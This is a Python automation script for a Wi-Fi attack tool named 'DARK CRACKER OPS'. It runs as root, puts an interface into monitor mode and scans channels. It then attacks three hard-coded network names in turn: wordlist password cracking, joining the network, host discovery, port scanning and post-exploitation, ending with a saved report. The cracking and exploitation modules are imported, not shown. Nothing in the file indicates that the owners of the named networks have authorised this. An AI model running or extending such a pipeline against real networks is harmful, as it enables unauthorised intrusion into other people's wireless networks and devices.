#!/usr/bin/env python3
"""
dc_autotest.py — Non-interactive test runner for DARK CRACKER OPS.
Scans networks, then attacks each specified target in sequence.
"""
import os
import sys
import threading
import time
from datetime import datetime

_ROOT = os.path.dirname(os.path.abspath(__file__))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

if os.geteuid() != 0:
    print("[!] Run as root: sudo python3 dc_autotest.py")
    sys.exit(1)

from core.config import ensure_dirs
ensure_dirs()

from cli.colors import cyan, green, red, yellow, bold, dim, RESET
from cli.automation import WiFiAutomation, _p, _step, _log, _find_wordlists

TARGET_SSIDS = ["MNW", "Xiaomi", "Dark Sea"]
IFACE        = "wlan0"
SCAN_SECS    = 45


def _show_banner():
    print(f"""{bold(cyan('''
██████╗  █████╗ ██████╗ ██╗  ██╗
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝
██║  ██║███████║██████╔╝█████╔╝
██║  ██║██╔══██║██╔══██╗██╔═██╗
██████╔╝██║  ██║██║  ██║██║  ██╗
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
      CRACKER OPS — Gen 2
'''))}
{dim('  Auto-Test Mode  |  Targets: ' + ', '.join(TARGET_SSIDS))}
""")


def _enable_monitor(iface: str) -> str:
    """Enable monitor mode, return actual monitor interface name."""
    from modules.interface_manager import InterfaceManager
    im = InterfaceManager()
    ok, mon = im.enable_monitor_mode(iface)
    if ok:
        print(f"  {green('✔')}  Monitor mode: {cyan(mon)}")
        return mon
    print(f"  {yellow('⚠')}  Monitor mode setup: {mon} — using {iface}")
    return iface


def _scan_networks(mon_iface: str, duration: int = SCAN_SECS) -> list:
    """Run WiFiScanner and return list of network dicts."""
    import subprocess
    import threading as _th

    done     = _th.Event()
    nets_ref = []

    _hop_stop = _th.Event()
    def _hop():
        while not _hop_stop.is_set():
            for ch in range(1, 14):
                if _hop_stop.is_set():
                    break
                try:
                    subprocess.run(
                        ["iwconfig", mon_iface, "channel", str(ch)],
                        capture_output=True, timeout=2,
                    )
                except Exception:
                    pass
                time.sleep(0.5)

    hop_t = _th.Thread(target=_hop, daemon=True)
    hop_t.start()

    from modules.wifi_scanner import WiFiScanner

    scanner = WiFiScanner(
        interface   = mon_iface,
        on_networks = lambda nets: (nets_ref.clear(), nets_ref.extend(nets),
                                    print(f"\r  Networks found: {green(str(len(nets_ref)))}   ",
                                          end="", flush=True)),
        on_log      = lambda t, m: None,
        on_done     = lambda: done.set(),
        duration    = duration,
    )
    scanner.start()
    done.wait(timeout=duration + 15)
    scanner.stop()
    scanner.join(timeout=5)
    _hop_stop.set()
    hop_t.join(timeout=2)
    print()
    return list(nets_ref)


def _attack_target(mon_iface: str, target: dict) -> None:
    """Run full attack pipeline against one target and save a report."""
    ssid  = target.get("ssid", "?")
    bssid = target.get("bssid", "?")
    print(f"\n{bold(cyan('=' * 60))}")
    print(f"  {bold(green('TARGET:'))} {bold(cyan(ssid))}  {dim(bssid)}")
    print(f"{bold(cyan('=' * 60))}\n")

    ts          = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_ssid   = ssid.replace(" ", "_").replace("/", "-")
    report_path = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        f"darkcracker_{safe_ssid}_{ts}.txt"
    )

    # Instantiate automation and inject the target so we skip interactive steps
    auto = WiFiAutomation(interface=mon_iface)
    auto.mon_iface = mon_iface
    auto._networks = [target]
    auto._target   = target
    auto._wordlists = _find_wordlists(ssid)
    auto._wordlist  = auto._wordlists[0] if auto._wordlists else ""

    print(f"  {green('✔')}  Wordlists: {cyan(', '.join(os.path.basename(w) for w in auto._wordlists))}")
    auto._event(f"Auto-test run started for {ssid} ({bssid})")

    try:
        auto._step_attack()
        if auto._password:
            auto._step_connect()
            auto._step_discover()
            auto._step_ports()
            auto._step_postex()
        else:
            print(f"\n  {yellow('⚠')}  Password not found — skipping post-exploitation.")
            auto._event("Password not found — skipping post-exploitation.")
    except KeyboardInterrupt:
        print(f"\n  {yellow('⚠')}  Interrupted.")
        auto._event("Run interrupted.")
    except Exception as e:
        print(f"\n  {red('✖')}  Error: {e}")
        auto._event(f"Error: {e}")
    finally:
        auto._save_report(report_path)
        print(f"\n  {green('✔')}  Report: {bold(cyan(report_path))}\n")


def main():
    _show_banner()

    print(cyan(f"  Enabling monitor mode on {IFACE}…"))
    mon_iface = _enable_monitor(IFACE)

    print(cyan(f"\n  Scanning for {SCAN_SECS}s…"))
    networks = _scan_networks(mon_iface, duration=SCAN_SECS)

    if not networks:
        print(f"  {red('✖')}  No networks found. Ensure wlan0 is in monitor mode.")
        sys.exit(1)

    print(f"  {green('✔')}  {len(networks)} network(s) found.\n")
    print(f"  {'#':<4}  {'SSID':<28}  {'BSSID':<20}  {'CH':>3}  {'ENC':<8}  {'PWR':>5}")
    print("  " + "─" * 72)
    for i, n in enumerate(networks, 1):
        print(f"  {cyan(str(i)):<4}  {n.get('ssid','<hidden>'):<28}  "
              f"{n.get('bssid',''):<20}  {str(n.get('channel','')):<4}  "
              f"{n.get('enc',''):<8}  {str(n.get('power',''))}")

    # Find each target SSID in the scan results
    targets_found = []
    for wanted in TARGET_SSIDS:
        match = next((n for n in networks if n.get("ssid","").lower() == wanted.lower()), None)
        if match:
            targets_found.append(match)
            print(f"\n  {green('✔')}  Found target: {bold(cyan(wanted))}")
        else:
            print(f"\n  {yellow('⚠')}  Target not found in scan: {wanted}")

    if not targets_found:
        print(f"\n  {red('✖')}  None of the targets found in scan.")
        sys.exit(1)

    for target in targets_found:
        try:
            _attack_target(mon_iface, target)
        except KeyboardInterrupt:
            print(f"\n  {yellow('⚠')}  Skipping remaining targets.")
            break


if __name__ == "__main__":
    main()
